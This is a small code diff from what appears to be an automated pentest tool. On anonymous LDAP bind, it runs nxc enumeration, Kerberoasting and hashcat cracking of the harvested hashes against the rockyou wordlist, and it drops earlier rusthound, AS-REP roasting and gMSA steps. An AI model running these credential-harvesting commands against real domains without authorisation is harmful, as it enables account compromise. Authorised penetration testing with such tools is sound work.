@@ -119,7 +119,7 @@ def ldap_tasks(context):
         try:
             ldap_conn.login("","")
             write_log(context.log_file, f"LDAP anonymous bind is enabled", "SUCCESS")
-            run_task(context, f"rusthound -d {context.domain} -f {context.hostname}.{context.domain} -n {context.ip} -z -o rusthound; unzip rusthound/* -d rusthound; nxc ldap {context.ip} -u '' -p '' --users --find-delegation --trusted-for-delegation --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; nxc ldap {context.ip} -u '' -p '' --gmsa; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force -o plaintext.asreproast; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
+            run_task(context, f"nxc ldap {context.ip} -u '' -p '' --users --find-delegation --trusted-for-delegation --kerberoasting hashes.kerberoast; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
         except Exception as e:
             return
 
